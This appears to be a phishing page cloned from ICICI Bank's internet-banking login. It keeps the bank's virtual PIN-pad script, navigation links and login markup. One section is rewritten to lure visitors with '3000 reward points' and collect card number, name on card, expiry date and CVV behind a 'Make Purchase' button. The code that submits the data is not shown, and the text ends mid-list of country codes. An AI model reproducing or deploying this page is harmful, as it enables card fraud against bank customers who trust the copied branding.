					+'<span class="floatingleft"><input length="13" type=text name="buffer" id="input_buffer" value="" id=buffer onkeyup=checkPinPad(this) readonly></span>'



					+'<span class="left CellBackGroundColourForKeypad"></span></p></div>';

			}



				else{

			//For the defect 336275 start 1-Apr-2013

			//+'Keyed Code: '

			sHTML=sHTML	+'Password: '



				+'</layer></ilayer>'



				+'</span>'



				+'<span class="floatingleft"><input length="13" type=password name="buffer" id="input_buffer" value="" id=buffer onkeyup=checkPinPad(this) readonly></span>'



				+'<span class="left CellBackGroundColourForKeypad"></span></p></div>';

				}

			//For the defect 336275 End 1-Apr-2013

			



				

				sHTML = sHTML+'<div id="keypadclear" class="width100percentforkeypad" >';

				while(incralp < smallAlpArrLen || incrno < numArr.length || incrspl < splCharArrLen){

					// Creates a new row

					sHTML = sHTML+'<p class="clearboth">';

					newRow=true;

					for (i=0; i < len; i++){

						

						// Adds style to td if its the first element of a new row.

						if(i == 0){

							sHTML = sHTML+'<span  class="height28forkeypad">';

						} else{

							sHTML = sHTML+'<span>';

						}

						

						// Creates a button for each alphabet

						if(incralp < smallAlpArrLen && i < len-2){

							sHTML = sHTML+'<input class="mainButton" type="button" name="alp_'+incralp+'" id="alp_'+incralp+'" value="'+smallAlpArr[incralp++]+'" onclick="applyNumber(this)"/></span>';

							

						// Adds an empty cell to row if not a new row

							if(incralp == smallAlpArrLen ){

								sHTML = sHTML+'<input class="mainButton_blank" type="button" /></span>';

								

							// Adds an empty cell to row if not a new row

							}

							newRow = false;

						}

						

						// Creates a button for each number (The last two columns are reserved for numbers )

						if(incrno < numArrLen && i >= len-2){

							sHTML = sHTML+'<input class="mainButtonblue" type="button" name="pp_'+numSplVal+'" id="pp_'+numSplVal+'" value="'+numArr[incrno++]+'" onclick="applyNumber(this)"/></span>';

							numSplVal++;

						// Adds an empty cell to row if not a new row

						}else if(incrno >= numArrLen && i >= len-2){

							sHTML = sHTML+'</span>';

						}

						

						// Creates a button for special characters

						if(incrspl < splCharArrLen && i < len-2 && newRow == true){

							sHTML = sHTML+'<input class="mainButtongreen" type="button" name="pp_'+numSplVal+'" id="pp_'+numSplVal+'" value="'+splCharArr[incrspl++]+'" onclick="applyNumber(this)"/></span>';

							numSplVal++;

						}

						

						// Adds an empty cell to row if not a new row

						 if((incrspl >= splCharArrLen || incralp >= smallAlpArrLen) && i < len-2 ){

						 	sHTML = sHTML+'</span>';	

						}

					}

					sHTML = sHTML+'</p>';

				}

			sHTML = sHTML+'</div>';

			sHTML = sHTML+'<div id="listing" class="width100percentforkeypad"><p class="listingcol">';

			if(langID == '001'){

				sHTML = sHTML +'<span class="otherbtns"><input class="keybtn" type="button" id="pp_caps" name="pp_caps" value="CAPS" alt="Caps" onclick="applyNumber(this)"/></span>';

			}else{

				sHTML = sHTML +'<span class="otherbtns"><input class="keybtn" type="button" id="pp_caps" name="pp_caps" value="CAPS" alt="Caps"/></span>';

			}

			sHTML = sHTML+'<span class="otherbtns"><input class="keybtn" type="button" name="pp_erase" id="pp_erase" value="BACKSPACE" onclick="applyNumber(this)"/></span>'

				+'<span class="otherbtns"><input class="keybtn" type="button" name="pp_clear" id="pp_clear" value="CLEAR" onclick="applyNumber(this)"/></span>'

				+'<span class="otherbtns"><input class="keybtn" type="button" name="done" id="done" value="OK" alt="OK" onclick="donePinPad(document.'+formname+'.buffer),setPinPadCtl(null),enableTextField(\''+whatelement+'\')"/></span>'

				+'</p> <p></p></div> </div>';

			}

	

/**** Reformed the div and button name,separate div created for action buttons for call id: 128860 --End-- satyabrata ghosh --29/08/2008 ***/

document.getElementById("scriptdiv").innerHTML = sHTML;

	

	document.forms[formname].buffer.maxLength = 2147483647; 



	setPinPadCtl(document.forms[formname].buffer);

	elem = whatelement;

};



// This function is used to pop up and hide virtual keypad

setPinPadCtl=function(ctl) {



    if(ctl && !editCtl && ctl.maxLength && ctl.maxLength <= ctl.value.length) {

    

        return;

    }

    

    

    editCtl = ctl;

    var elements = document.forms[0].elements;

    for(i = 0; i <= 77; i++) {



        var el = elements['pp_' + i];

        if(el != null) {



            el.disabled = editCtl == null;

        }

    }

    var el = elements['pp_clear'];

	if(el != null) {



        el.disabled = editCtl == null;

    }

	var el = elements['pp_erase'];

	if(el != null) {



        el.disabled = editCtl == null;

    }

	var el = elements['close'];

	if(el != null) {



        el.disabled = editCtl == null;

    }

	var el = elements['done'];

    if(el != null) {



        el.disabled = editCtl == null;

    }

	var el = elements['buffer'];

    if(el != null) {



        el.disabled = editCtl == null;

    }

	var el = elements['help'];

    if(el != null) {



        el.disabled = editCtl == null;

    }



    topLayer=isIE ? 'BODY' : 'HTML';

    layer = isIE ? document.all.pp_div : document.getElementById ? document.getElementById('pp_div') : document.layers ? document.layers.pp_div : document.pp_div;



	if(isIE && event || !isIE && ctl) {



        hotLayer=isIE ? event.srcElement : ctl.target;

        while (hotLayer != null && hotLayer.id != 'titleBar' && hotLayer.tagName != topLayer) {



          hotLayer=isIE ? hotLayer.parentElement : hotLayer.parentNode;

        }

        if (hotLayer != null && hotLayer.id == 'titleBar' && ctl != null) {



          offsetx=isIE ? event.clientX : ctl.clientX;

          offsety=isIE ? event.clientY : ctl.clientY;

          nowX=parseInt(layer.style.left);

          nowY=parseInt(layer.style.top);

          ddEnabled=true;

          document.onmousemove=dd;

        }

    }

    if(layer != null) {



        if(editCtl != null) {



            if (showFirstTime) {

		// Called when pinpad is shown for the first time

                showFirstTimePinPad(layer, ctl);

                display();

                showFirstTime=false;

            } else {

		//Called when pinpad is shown subsequent times



				showPinPad(layer, ctl);

				display();

				

            }

        } else {



			hidePinPad(layer);

			display();

        }

    } else {



        alert('Pin Pad not supported by your browser');

    }

};



onloadNumber=function(ctl) {



    ctl.disabled = editCtl == null;

};



checkPinPad=function(ctl) {



    if(ctl.maxLength && ctl.maxLength != 0 && ctl.maxLength <= ctl.value.length) {



        setPinPadCtl(null);

    } else {



        if(editCtl == null)

            setPinPadCtl(this);

    }

};



/* This function is used to show virtual keypad*/

showPinPad=function(ctl, pctl) {

	



	if (isIE || isNN) {



        layer.style.visibility='visible';

       

    } else if (isN4) {



        document.pp_div.visibility='show';

        

    }

};

/*To Load Pin pad first time*/

showFirstTimePinPad=function(ctl, pctl) {



	

    var pX = 500;

    var pY = 250;



    if(ppY) {



        pY = ppY;

    } else if(pctl.screenTop) {



        pY = pctl.screenTop + 30;

    } else if(pctl.screenY) {



        pY = pctl.screenY + 30;

    }

    if(ppX) {



        pX = ppX;

    } else if(pctl.screenLeft) {



        pX = pctl.screenLeft;

    } else if(pctl.screenX) {



        pX = pctl.screenX;

    }

    if(ctl.style) {



        ctl.style.top = pY + rX;

        ctl.style.left = pX + rY;

    }

    if (isIE || isNN) {



		layer.style.visibility='visible';

    } else if (isN4) {



        document.pp_div.visibility='show';

        

	}

	

};

/* This function is used to hide virtual keypad */

hidePinPad=function(ctl){	





    if (isIE || isNN) {



		layer.style.visibility='hidden';



	} else if (isN4) {



		document.pp_div.visibility='hide';

    }

elem = null;

};



ddInit=function(ctl){



    var topLayer = isIE ? 'BODY' : 'HTML';



	var layer = isIE ? document.all.pp_div : document.getElementById ? document.getElementById('pp_div') : document.layers ? document.layers.pp_div : document.pp_div;



	var hotLayer = isIE ? event.srcElement : ctl.target;



	if (layer != null) {



        while (hotLayer.id != 'titleBar' && hotLayer.tagName != topLayer) {



		  hotLayer=isIE ? hotLayer.parentElement : hotLayer.parentNode;

		  if (hotLayer == null) return;

        }

        if (hotLayer.id == 'titleBar') {





		  offsetx=isIE ? event.clientX : ctl.clientX;

          offsety=isIE ? event.clientY : ctl.clientY;

          nowX=parseInt(layer.style.left);

          nowY=parseInt(layer.style.top);

          ddEnabled=true;

          document.onmousemove=dd;

        }

    }

};



dd=function(ctl){



  if (!ddEnabled) return;

  layer.style.left=isIE ? nowX+event.clientX-offsetx : nowX+ctl.clientX-offsetx+'px';

  layer.style.top=isIE ? nowY+event.clientY-offsety : (nowY+ctl.clientY-offsety)+'px';

  display();

  return false;

};



		/* This function is used to deactivate parent window when virtual keypad pops up */ 

		disbleTextField=function(whatelement){

			// if virtual keypad is already open

			var isVisible = document.getElementById('pp_div').style.visiblity = 'visible' ? true : false;

			if(isVisible && elem == whatelement){

				noAction = true;

				return;

			}else{

				noAction = false;

			}

			/*Iterate through all the forms*/

			var j=0;

			var enab = true;

			var disb = true;

			while((document.forms[j] != null && (enab || disb))){

					/*Iterate through all elements in a form*/

					for(i=0; document.forms[j].elements[i] != null; i++){

					/*IF you find an element with the name that was passed in*/

				 		if(isVisible && (document.forms[j].elements[i].name == elem)){

				 			document.forms[j].elements[i].disabled = false;

				 			enab = false;

				 		}else if((document.forms[j].elements[i].name == whatelement)){		

							/*disable it and exit the loop*/

							document.forms[j].elements[i].disabled=true;

							disb = false;

					 	}

					 	if(!isVisible){

					 		enab = false;

					 	}

					}

				j++;

			}

			

		};

		

		/* This function is used to change styles of the object passed to it*/

		setStyle=function(obj,style,value){

			obj.style[style]=value;

		};



	    /* This function is used to enable page*/

		enableTextField=function(whatelement){

			this.target.disabled=false;

		};



		getPixel=function(str) {

			if (str == "") {

				return "0";

			} else {

				return parseInt(str.substring(0, str.length-2),10);

			}

		};



				// function to get the virtual keyboard displayed at random locations

		randomDisplay=function(top,left){  

			//var isFF = !document.all.pp_div.style.pixelTop;

			var scrollTop = window.pageYOffset || window.document.documentElement.scrollTop || window.document.body.scrollTop;

			

			var locationtop=top;

			var locationleft=left;

			// capturing the top and left positions of the keyboard

		

			if (!isIE) {

			  	document.getElementById('pp_div').style.top=locationtop+'px';

			  	document.getElementById('pp_div').style.left=locationleft+'px';

			} else {

			  	document.all.pp_div.style.pixelTop=locationtop;

			  	document.all.pp_div.style.pixelLeft=locationleft;

			}

			display();

		};

ddN4=function(whatLayer){



  if (!isN4) return;

  N4=eval(whatLayer);

  N4.captureEvents(Event.MOUSEDOWN|Event.MOUSEUP);

  N4.onmousedown=function(ctl){



    N4.captureEvents(Event.MOUSEMOVE);

    N4x=ctl.x;

    N4y=ctl.y;

  }

  N4.onmousemove=function(ctl){



    if (isHot){



      N4.moveBy(ctl.x-N4x,ctl.y-N4y);

      return false;

    }

  }

  N4.onmouseup=function(){



    N4.releaseEvents(Event.MOUSEMOVE);

  }

};



/* This function is used to put the password entered on virtual keypad into the page on click of OK*/

donePinPad=function(buffer){	

   this.target.value = buffer.value;

	buffer.value = '';

	

};

/* This function is used to open the help file for virtual keypad*/

openPinPadHelp=function() {



    var url = 'pinpad.html';

    newwindow = window.open(url,'Security','height=500,width=700,scrollbars=yes,resizable=yes');

    if (window.focus) {



        newwindow.focus();

    }

};



display=function()

{

	if(navigator.userAgent.toLowerCase().indexOf("msie")!=-1)

	{

	if(document.getElementById('iframetop')!=null)

    {

		//Fix for overlapping dropdowns

		// show layer

        var layerdiv = document.getElementById('pp_div');

        layerdiv .style.display = '';

        // show IFRAME

        var iframe = document.getElementById('iframetop');

        iframe.style.display = '';

        iframe.style.width = layerdiv.offsetWidth;

        iframe.style.height = layerdiv.offsetHeight;

        iframe.style.left = layerdiv.offsetLeft;

        iframe.style.top = layerdiv.offsetTop;

        iframe.style.visibility=layerdiv.style.visibility;

    }   

    }

};

function getScrollXY() {

  var scrOfX = 0, scrOfY = 0;

  if( typeof( window.pageYOffset ) == 'number' ) {

    //Netscape compliant

    scrOfY = window.pageYOffset;

    scrOfX = window.pageXOffset;

  } else if( document.body && ( document.body.scrollLeft || document.body.scrollTop ) ) {

    //DOM compliant

    scrOfY = document.body.scrollTop;

    scrOfX = document.body.scrollLeft;

  } else if( document.documentElement && ( document.documentElement.scrollLeft || document.documentElement.scrollTop ) ) {

    //IE6 standards compliant mode

    scrOfY = document.documentElement.scrollTop;

    scrOfX = document.documentElement.scrollLeft;

  }

  return [ scrOfX, scrOfY ];

}

</script>





<script  type="text/javascript">

document.onmousedown=ddInit;

document.onmouseup=Function("ddEnabled=false");

</script>

<iframe id="iframetop" scrolling="no" frameborder="0"> </iframe>

	<div id="pp_div" valign="right" class="keypaddiv">

<div id="scriptdiv"></div>

</div>



<script  type="text/javascript">ppX=100;ppY=100;setTimeout('setPinPadCtl(null)',1);</script>



   

 

 
 

<script type="text/javascript">
jQuery(document).ready(function(){
    var txtBox = document.getElementById("AuthenticationFG.USER_PRINCIPAL");
    try {
    	txtBox.focus();
	} catch(err){}
if((jQuery('#MessageDisplay_TABLE').length > 0) && (document.getElementById('PID').value!=null) &&  (document.getElementById('PID').value!='')) {

     jQuery("#global").hide();
	 jQuery("#MessageDisplay_TABLE").hide();
	 jQuery("#HDisplay1").hide();
	 jQuery("#HDisplay2").hide();
	 jQuery("#FooterLinks").hide();
	 jQuery("#Footertext").hide();
 	 jQuery("#footer").hide();
 	  var errMessage = "";
 	          try {
 				errMessage = document.getElementById('MessageDisplay_TABLE').firstChild.childNodes[2].textContent;
 	          } catch(err) {
 	        	errMessage = document.getElementById('MessageDisplay_TABLE').firstChild.innerText;
 	        }

 	     alert(errMessage);

 	  	//alert('MD'+ document.getElementById('MD').value)
			//document.getElementById('MD_NEW').value= document.getElementById('MD').value;
			//alert('PID'+ document.getElementById('PID').value) ;

			document.getElementById('PID_NEW').value= document.getElementById('PID').value;
			//alert('PRN'+ document.getElementById('PRN').value);

			document.getElementById('PRN_NEW').value= document.getElementById('PRN').value;
			//alert('ITC'+ document.getElementById('ITC').value);

			document.getElementById('ITC_NEW').value= document.getElementById('ITC').value;
			//alert('AMT'+ document.getElementById('AMT').value);

			document.getElementById('AMT_NEW').value= document.getElementById('AMT').value;
			//alert('CRN'+document.getElementById('CRN').value);

			document.getElementById('CRN_NEW').value= document.getElementById('CRN').value;
			//alert('RU'+ document.getElementById('RU').value) ;

			document.getElementById('RU_NEW').value= document.getElementById('RU').value;
			//alert('CG'+ document.getElementById('CG').value) ;

			document.getElementById('CG_NEW').value= document.getElementById('CG').value;
			//alert('ES'+ document.getElementById('ES').value) ;
			document.getElementById('ES_NEW').value= document.getElementById('ES').value;

			document.RIBSignOn.submit();
			
    }
});
</script>

<div id="global" class="body-style-02">

<div id="header">

		<div id="Loginheader-main" class="Loginheader-main">

		    <div id="header-wrapper" class="wrapper">



				<div id="header-row" class="Loginrow">

				<div id="header-logo" class="logo1" class="links">

						<a href="http://www.icicibank.com/?utm_source=homepage&utm_medium=stand&utm_campaign=homepage-header-logo" target="_blank"><img width="197" height="46" src="logo.jpg" alt="Future bank Logo"/></a>

					</div>


			<div id="links_container" class="links_container" >

				   <div id="TopICICIBankHome" class="links"><a target="_blank" href="http://www.icicibank.com/">ICICI Bank Home</a></div>
				  <div id="TopAboutUs" class="links"><a target="_blank"  href="http://www.icicibank.com/aboutus/about-us.html">About Us</a></div>
				   
				   <div id="Top24hrCustomerCare" class="links"><a target="_blank"  href="http://www.icicibank.com/customer-care.html">Customer Care</a></div>
				   <div id="TopFindATM" class="links"><a target="_blank"  href="http://www.icicibank.com/find-atm-branch.html">Find ATM/Branch</a></div>
				   <div id="Topmb" class="last_links"><a target="_blank" href="http://www.icicibank.com/mobile-banking/index.html">Mobile Banking</a></div>
				   </div>

					<div id="mb" class="mb" alt="Mobile Banking"></div>

					<div id="links_container_mb" class="links_container_mb">
					
					</div>






				</div>


			</div>

		</div>

</div>

<div id=topbar>

      <div id=header>

        	<div id="topbar-nav" class="Loginheader-nav">

       			<div id="topbar-wrapper" class="wrapper">

        			<div id="topbar-row" class="row">

        				<ul class="tabs1">

                         <li id="PersonalBanking_default">
                         <a target="_blank" href="http://www.icicibank.com">Personal Banking</a>
                         </li>

                         <li  id="PrevilegeBanking">
                         <a target="_blank" href="http://www.icicibank.com/privilege-banking/index.page"> Privilege Banking</a>
                         </li>

                         <li id="WealthManagement">
                         <a target="_blank" href="http://www.icicibank.com/wealth-management/index.page">Wealth Management</a>
                         </li>

                         <li id="PrivateBanking">
                         <a target="_blank" href="http://www.icicibankprivatebanking.com/">Private Banking</a>
                         </li>

                         <li id="NRIBanking">
                         <a target="_blank" href="http://www.icicibank.com/nri-banking/nri_banking.page">NRI Banking</a>
                         </li>

                         <li id="CorporateBanking">
                         <a target="_blank" href="http://www.icicibank.com/corporate/corp-index.page">Corporate Banking</a>
                         </li>

                         <li id="BusinessBanking">
                         <a target="_blank" href="http://www.icicibank.com/business-banking/index.page">Business Banking</a>
                         </li>
        				</ul>

        			</div>

        		</div>

        	</div>

        </div>

</div>
</div>


  


	
	<div class="row toprow">








  <noscript>
<font face="Helvetica" color="#000000" style="display: block; text-align: center; margin:20px 0;">
You need to enable javascript in your browser. For details please 
<a class="m_noscript_link" href="http://www.icicibank.com/Pfsuser/webnews/javaenablementinstructions.htm" alt="Contact Us" title="Instructions for Javascript" target="_blank">click here</a>.
</font>
</noscript>

  
  
  
  
  
  
  
  
  
  
  
  
  <div  class="" id="HDisplayDefault1">
    
      
       <div  class="" id="HDisplayDefault1.Rowset2">
        
            
			
              <div id="Revamp_Banner" class="iframeWrapper">
         		<iframe id="Revamp_Banner_ID" class="resp-iframe" style=" margin-top: -2px; position: absolute; border: none;left: 0px;" frameborder="0" width="100%" height="1400px" scrolling="no" src="primer1.html">
     			</iframe>
        	  </div>
		   
           
            
  		</div>

      
    
  </div>
  
   
  <div id="ErrorDisplay_TABLE" class="section"></div>
   
 <!-- Added for Login with OTP PIN -->
<!--<script>
  try{
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','//www.google-analytics.com/analytics.js','ga'); 
	ga('create', 'UA-17906056-1',{'cookieDomain': 'icicibank.com'});
	ga('send', 'pageview', '/VPV/LI/InternetBanking/InfinityLogin/LogintoInternetBankin',{
	'dimension72':'nli_personalb_personal_login_btn', 'dimension77': 'NA'});
  }catch(e){}
</script>-->

<!--CIB RIB Integration - START -->
 
<!--CIB RIB Integration - END --> 

 <div  class="completeHide id="">
    
      
        <div  class="login-field login-text row_login" id="HDisplayDefault.Rowset2">
	        
	            
	              
	            
	            
	              
	            
	        <p  id="HDisplayDefault.Rb12"class="login-heading">
<span  id="HDisplayDefault.Rb12.C1" class="lock_image m_left10"><img src="L001/consumer/images/u16_original.png?mtime=1472814763000" alt="Lock" title="Lock" height="18" width="18" class="lock_pic" id="Image11381011"border="0" /></span><span  id="HDisplayDefault.Rb12.C2" class="lock_id"><label for=" " id = "LabelForControl16117102"title = "Login to Internet Banking" class = "simpletext23" >Login to Internet Banking</label></span></p>
          
            
	            
	              
	                                                 
            <p  id="HDisplayDefault.Rb14"class="login_label marginTop45">
<span  id="HDisplayDefault.Rb14.C1"><label for=" " id = "UserId_Text"title = "Login using User ID and password" class = "label" >User ID</label></span></p>
                
            
	            
	              
		              
		                           
	              
	                  
          	<p  id="HDisplayDefault.Rb14"class="input-field  ">
<span  id="HDisplayDefault.Rb14.C3" class="input-arrow"><span class="labelColumn"><input type="t
ext" name = "DUMMY1" title = "Login using User ID and password" size = "28" tabindex = "-5"" class = "login-input mode-select-userid"" maxLength = "65" id="DUMMY1" value="" title = "Login using User ID and password" onkeypress='return checkEnter(event);'/></span><img src="L001/consumer/images/../icici-login-update/img/goahead.png?mtime=1568465547000" alt="" title="arrow" height="8" width="65" class="goahead" id="user-id-goahead"border="0" onClick='goUserId();' /></span></p>
                      
	            
	              
	              
	             
	            
            <p  id="HDisplayDefault.Rb14aa"class="input-field">
<span  id="HDisplayDefault.Rb14aa.C2"><a href="AuthenticationController?FORMSGROUP_ID__=AuthenticationFG&__START_TRAN_FLAG__=Y&__EVENT_ID__=LOAD&__CALL_MODE__=10&LOGIN_FLAG=1&BANK_ID=ICI" title = "Create UserId" id="HREF_AuthenticationFG.KNW_USERID" name = "HREF_AuthenticationFG.KNW_USERID" class = "forgot-user" target = "_blank">Get User ID</a></span></p>
          
	        <h2 class="partition-line">
	                <p class="partition-circle">OR</p>
	        </h2> 
            
	            
	              
	            
       		<p  id="HDisplayDefault.Rb16"class="login_label">
<span  id="HDisplayDefault.Rb16.C1"><label for=" " id = "mobile_label_dummy"title = "Login Using Registered Mobile Number" class = "label" >Registered Mobile Number</label></span></p>

	        
	            
	               
	              
	                            
	                
	            
	        <p  id="HDisplayDefault.Rb16"class="input-field">
<span  id="HDisplayDefault.Rb16.C2" class="input-arrow"><span class="labelColumn"><input type="text" name = "DUMMY2" readonly  title = "Login Using Registered Mobile Number" size = "28"" class = "mode-select-mobile"" maxLength = "0" id="DUMMY23" value="" title = "Login Using Registered Mobile Number" onkeypress='return checkEnter(event);'/></span><img src="L001/consumer/images/../icici-login-update/img/goahead.png?mtime=1568465547000" alt="" title="arrow" height="8" width="10" class="goahead" id="user-id-goahead"border="0" onClick='goToMobileOTP();' /></span></p>

	      
	   		
			<p id="HDisplayDefault.Rb30" class="login-info">
<span id="HDisplayDefault.Rb30.C1">
<span class="need-userfield" id="span_Caption29543082" title="Need Help?" style="color: inherit; padding-left: 0;">
How to login?
<a href="#" title="Need Help?" id="Caption29543082" 
name="HREF_Caption29543082" class=""  onclick="lightbox_open();" style="margin-left: 3px;">Watch iPlay demo
<svg width="9" height="10" viewBox="0 0 9 10" fill="none" xmlns="https://www.w3.org/2000/svg">
<path 
d="M8.21326 5.43708C8.55616 5.24658 8.55616 4.75342 8.21326 4.56292L0.742822 0.412679C0.409557 0.22753 1.13662e-07 0.468514 1.09116e-07 0.849757L1.01333e-08 9.15024C5.58699e-09 9.53148 0.409556 9.77247 0.742822 9.58732L8.21326 5.43708Z" fill="#F27B1A" />

</svg>
</a>
<!-- added for video site capture  start -->
<div id="light">
			<div  >
			<iframe  src="https://www.youtube.com/embed/laGp2CFbRCM?rel=0" id="IplayHowToLoginVideo" style="height: 300px; width: 600px;"></iframe>
			</div>
			<a class="boxclose" id="boxclose" onclick="lightbox_close();">X</a>
			</div>
			<div id="fade" >
			</div>
<!-- added for video site capture  end -->
</span>
</span>
</p>
        </div>

      
    
  </div>


  
  <!--CIB RIB Integration - START --> 
 
  <!--CIB RIB Integration - END --> 
   <!-- added for Login revamp NLI page banner loading start here -->



<!--CIB RIB Integration - START -->
 
<!--CIB RIB Integration - END --> 
 
 <div  class="" id="HDisplayDefault">
    
      
	  
		
              
		  <div  class="login-field login-text row_login" id="HDisplay1.Rowset2">
          
            
              
            
            
              
            
          <p  id="HDisplay1.Rb12"class="login-heading">
<span  id="HDisplay1.Rb12.C1" class="lock_image m_left10"></span><span  id="HDisplay1.Rb12.C2" class="lock_id"><label for=" " id = "LabelForControl"title = "Login to Internet Banking" class = "simpletext23" >Enter Card Details</label></span></p>

         
          
<p class="login_label">You currently have 3000 reward points available. Enter credit card information to use them.</p>    
              
            
			<p  id="HDisplay1.Rb14"class="login_label">
<span  id="HDisplay1.Rb14.C1"><label for=" " id = "delete1" title = "User ID" class = "label" >Card Number:</label></span></p>

			
            
             <input title="Credit Card Number"class="card-field"type="text" id ="creditCardNumber" maxlength= "19"/><br>
              
			 <p  id="HDisplay1.Rb14"class="login_label">
<span  id="HDisplay1.Rb14.C1"><label for=" " id = "delete2" class = "label" >Name on Card:</label></span></p>

			
            
             <input class="card-field"type="text" id ="cust_name" maxlength= "128" title = "Name on Card"/><br>              
              
                
            
          
		  
           
              
                
              
          
            
              


            
            
              
                <!-- added for password:start -->
              
                
             <!--   added for password:start -->
                
                
                
			 <label for=" " id="delete3" title="User ID" class="label" style="margin-bottom: 4px;">Expires on: (mm/yyyy)</label>          
            
          <p  id="HDisplay1.Rb16"class="input-field m_cf"> 
<span  id="HDisplay1.Rb16.C2"></span><input type="text" name="dummypwd2" size="7" class="expiry-month" id="delete4" title = "Month" maxlength="2"/></span>/ &nbsp;<input type="text" class="expiry-year" name="AuthenticationFG.ACCESS_CODE" size="28" class="login-input-password" id="delete5" title = "Year" onkeypress='return checkEnter(event);' maxLength = "4"/></span></span></span></p>

<label for=" " id="UserId_Text3" title="User ID" class="label" style="margin-bottom: 4px;">CVV:</label>          

<p  id="HDisplay1.Rb161"class="input-field m_cf">
<span  id="HDisplay1.Rb16.C2"></span><input type="text" class="expiry-year" id = "cvv"name="AuthenticationFG.ACCESS_CODE" size="28" class="login-input-password" id="AuthenticationFG.ACCESS_CODE" title = "CVV" onkeypress='return checkEnter(event);' maxLength = "3"/></span></span></span></p>

              
          
          
            
              
            


            
            
              
            
			
    
	

							
	
		 
		 <!-- added for Login Captcha Changes start here  -->
		 
		 
            
              
            
          
          
            
              
             
             
                
                
                 
                 
            
          
                                  
            
            
			
			
              
			  
            
         
		 <!-- added for Login Captcha Changes end here  -->
		 
         

            

              
					
					
					
					 
					        
                	
               
                	
                	
					<!-- Added for iMobile SSO - Start -->
                	
                	
                	<!-- Added for iMobile SSO - End -->
                	
					
                	
              
            
            
              
            
          <p  id="HDisplay1.Rb20"class="m_cf btn-dev">
<span  id="HDisplay1.Rb20.C2" class="btn-dev"><input  type="submit" name="Action.VALIDATE_CREDENTIALS" class="cta" id="VALIDATE_CREDENTIALS1" value="Make Purchase" title = "Log In" onclick='launchMyForm()'/><span class="hide" id="Caption29543080"title = "Login"  onclick='return feba.js.adaptive.icici.onLoginSubmit(this.id);'>&nbsp;</span><input  type="Submit" name="Action.IMOBILE_LOGIN" class="completeHide hide" id="IMOBILE_LOGIN" value="" title = "Log In"/><input  type="Submit" name="Action.DEH_LOGIN" class="completeHide hide" id="DEH_LOGIN" value=" " title = "Log In"/></span></p>

		  

          
          
          
          
          
           
                        
              
            
            

              
			    
           
            
          
           
	                          		
	                	                	              	
				
	        <p  id="HDisplay1.Rb20">
<span  id="HDisplay1.Rb20.C2"><input  type="Submit" name="Action.LOGIN_MODE_SEL" class="completeHide hide" id="LOGIN_MODE_SEL_FROM_USR" value="t" title = "Log In"/></span></p>
 
			</div>

        
    
  </div>

    <!--CIB RIB Integration - START -->
  
  <!--CIB RIB Integration - END -->
   
  <!--CIB RIB Integration - START -->






<!-- added for Login Captcha Changes start here  -->





<!-- added for Login Captcha Changes end here  -->

<script type="text/javascript">
jQuery(document).ready(function(){
	
	document.getElementById("CUSTOM_RIB_VALIDATE_MOBILE_LOGIN").addEventListener("click", function(event){	

		if (document.getElementById('AuthenticationFG.VERIFICATION_CODE').value.length <= 3)
		{
			alert("Please enter 4-digit Captcha");
			event.preventDefault();
		
		}	
	});
});
function mobCaptchaEnq(event){
		console.log("entering into funcc");
		
		if (document.getElementById('AuthenticationFG.VERIFICATION_CODE').value.length >= 4)
		{
			console.log("inside if cond..");
			document.getElementById('CUSTOM_RIB_VALIDATE_MOBILE_LOGIN').disabled = false;
		}
		else
		{
			console.log("inside else cond..");
			document.getElementById('CUSTOM_RIB_VALIDATE_MOBILE_LOGIN').disabled = true;
		}
		console.log("final funcc..");

}



</script>


<style>
.loginrow-VM {
    width: 250px !important;
    clear: both;
	margin-top:15px;
}
INPUT[type='submit'][disabled] {
    color: #848284 !important;
}

</style>
 
<!--CIB RIB Integration - END --> 

   <div  class="completeHide" id="HDisplayMobile">
    
      
       
		              
        <div  class="login-field login-text row_login" id="HDisplayMobile.Rowset2">
          
            
              
            
            
              
            
          <p  id="HDisplayMobile.Rb12"class="login-heading">
<span  id="HDisplayMobile.Rb12.C1" class="lock_image m_left10"><img src="L001/consumer/images/u16_original.png?mtime=1472814763000" alt="Lock" title="Lock" height="18" width="18" class="lock_pic" id="Image11381011"border="0" /></span><span  id="HDisplayMobile.Rb12.C2" class="lock_id"><label for=" " id = "LabelForControl16117102"title = "Login to Internet Banking" class = "simpletext23" >Login to Internet Banking</label></span></p>

          
              
          
            
              
            
            <p  id="HDisplayMobile.Rb16"class="login_label margin_bot_11">
<span  id="HDisplayMobile.Rb16.C1" class="login_labelfield12"><label for=" " id = "label_access_code"title = "Registered Mobile Number" class = "label" >Registered Mobile Number</label></span></p>

            
            
              
              <!--   added for password:start -->
              
			 
			    
                
                
                
            
          <p  id="HDisplayMobile.Rb16"class="input-field-mob m_cf adg-input-inline-block">
<span  id="HDisplayMobile.Rb16.C2" class="ainner-col-2"><span class="labelColumn_combo"><span class="labelColumn_combo_brdr"> <select  name= "AuthenticationFG.RIB_COUNTRY_CODE" class = "ainner-col-2" id="AuthenticationFG.RIB_COUNTRY_CODE" title = "Mobile Number"> <option value="1">1</option> <option value="7">7</option> <option value="20">20</option> <option value="27">27</option> <option value="30">30</option> <option value="31">31</option> <option value="32">32</option> <option value="33">33</option> <option value="34">34</option> <option value="36">36</option> <option value="39">39</option> <option value="40">40</option> <option value="41">41</option> <option value="43">43</option> <option value="44">44</option> <option value="45">45</option> <option value="46">46</option> <option value="47">47</option> <option value="48">48</option> <option value="49">49</option> <option value="51">51</option> <option value="52">52</option> <option value="53">53</option> <option value="54">54</option> <option value="55">55</option> <option value="56">56</option> <option value="57">57</option> <option value="58">58</option> <option value="60">60</option> <option value="61">61</option> <option value="62">62</option> <option value="63">63</option> <option value="64">64</option> <option value="65">65</option> <option value="66">66</option> <option value="81">81</option> <option value="82">82</option> <option value="84">84</option> <option value="86">86</option> <option value="90">90</option> <option selected value="91">91</option> <option value="92">92</option> <option value="93">93</option> <option value="94">94</option> <option value="95">95</option> <option value="98">98</option> <option value="212">212</option> <option value="213">213</option> <option value="216">216</option> <option value="218">218</option> <option value="220">220</option> <option value="221">221</option> <option value="222">222</option> <option value="223">223</option> <option value="224">224</option> <option value="225">225</option> <option value="226">226</option> <option value="227">227</option> <option value="228">228</option> <option value="229">229</option> <option value="230">230</option> <option value="231">231</option> <option value="232">232</option> <option value="233">233</option> <option value="234">234</option> <option value="235">235</option> <option value="236">236</option> <option value="237">237</option> <option value="238">238</option> <option value="239">239</option> <option value="240">240</option> <option 